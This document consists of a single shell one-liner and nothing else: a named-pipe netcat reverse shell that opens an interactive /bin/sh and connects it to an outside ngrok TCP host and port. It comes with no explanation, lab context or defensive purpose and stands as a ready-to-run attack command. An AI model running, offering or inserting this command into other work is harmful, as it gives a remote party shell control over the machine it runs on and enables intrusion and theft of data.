rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 2.tcp.ngrok.io 11909 >/tmp/f
